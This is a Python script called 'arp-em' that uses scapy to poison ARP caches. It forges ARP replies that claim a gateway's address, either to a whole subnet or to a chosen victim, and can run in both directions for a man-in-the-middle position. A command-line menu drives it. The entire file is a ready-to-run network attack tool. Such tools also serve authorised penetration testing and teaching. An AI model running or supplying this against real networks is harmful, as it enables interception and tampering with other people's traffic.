#!/usr/bin/python3

import argparse
import os
import sys
from scapy.all import *

def arpPoison(gWay, target = None, opcode = 'who-has', interval = 3,
              direction = 'one-way', iFace = None):
    """Poison an ARP cache with your MAC Address

    If no target is declared, then poison the whole subnet.
    If no target is declared, opcode is hardcoded for 'is-at'.
    If no target is declared, direction is hardcoded to 'one-way'.

    If target is declared, direction may be set to 'two-way'

    iFace is the interface and the recommended practice
    is to let scapy deal with it.
    """
    ## Grab our hwaddr if we are defining an interface
    if iFace:
        smac = get_if_hwaddr(iFace)

    ## Broadcast attack
    if target is None:
        p = Ether(dst = 'ff:ff:ff:ff:ff:ff')/\
            ARP(op = 'is-at', hwdst = 'ff:ff:ff:ff:ff:ff', psrc = gWay)

    ## Targeted attack
    else:
        gmac = getmacbyip(gWay)
        tmac = getmacbyip(target)

        ## Let scapy decide the interface
        if not iFace:
            p = Ether(dst = tmac)/\
                ARP(op = opcode, psrc = gWay, pdst = target)

        ## You choose the interface
        else:
            p = Ether(src = smac, dst = tmac)/\
                ARP(op = opcode, psrc = gWay, pdst = target)

        if direction == 'two-way':

            ## Let scapy decide the interface
            if not iFace:
                p2 = Ether(dst = gmac)/\
                     ARP(op = opcode, psrc = target, pdst = gWay)

            ## You choose the interface
            else:
                p2 = Ether(src = smac, dst = gmac)/\
                     ARP(op = opcode, psrc = target, pdst = gWay)

    try:
        ## Let scapy decide the interface
        if not iFace:
            while True:
                sendp(p, iface_hint = target)
                if direction == 'two-way':
                    sendp(p2, iface_hint = target)
                time.sleep(interval)

        ## You choose the interface
        else:
            while 1:
                sendp(p, iface = iFace)
                if direction == 'two-way':
                    sendp(p2, iface = iFace)
                time.sleep(interval)
    except KeyboardInterrupt:
        pass


def main(args):
    """Parse the options and run arpPoison()"""

    ## Deal with no gateway specified
    if args.g is None:
        print('Gateway is required')
        sys.exit(1)

    ## Deal with -d and no target
    if args.d is True and args.t is None:
        print('Two-way arpspoof requires a target')
        sys.exit(1)

    ## Deal with opcode and direction
    if args.t is None:
        opcode = 'is-at'
        direction = 'one-way'
    else:
        if not args.o:
            opcode = 'who-has'
        else:
            opcode = args.o

        ## Deal with direction
        if args.d:
            direction = 'two-way'
        else:
            direction = 'one-way'

    ## Deal with pause
    if args.p:
        interval = int(args.p)
    else:
        interval = 3

    ## Poison
    arpPoison(args.g, args.t, opcode, interval, direction, iFace = None)


def menu():
    """Help menu"""
    if len(sys.argv) > 1:
        pass
    else:
        os.system('clear')
        print('arp-em - the new and improved ARP spoofer')
        print('')
        print('*******************************************')
        print('**           Required  Options           **')
        print('*******************************************')
        print('  -g <Gateway>')
        print('    Targeted Gateway IP')
        print('*******************************************')
        print('**           Available Options           **')
        print('*******************************************')
        print('  -d <Spoof both hosts>')
        print('    Two-way arpspoof')
        print('')
        print('  -i <interface>')
        print('    Your spoof interface')
        print('')
        print('  -o <opcode>')
        print('    Set the opcode')
        print('    Target is required')
        print('    Defaults to who-has')
        print('')
        print('  -p <Pause>')
        print('    Time in seconds to pause between arps')
        print('')
        print('  -t <Target IP>')
        print('    Targeted IP')
        sys.exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'arp-em', usage = menu())
    parser.add_argument('-g', help = 'Choose the Gateway [Optional]')
    parser.add_argument('-d', action = 'store_true', help = '2-way attack [-t must be invoked]')
    parser.add_argument('-i', help = 'Set the interface [Optional]')
    parser.add_argument('-o', help = 'Choose the opcode [Optional]')
    parser.add_argument('-p', help = 'Choose the pause period between arps [Optional]')
    parser.add_argument('-t', help = 'Choose the victim [Optional]')
    args = parser.parse_args()
    main(args)
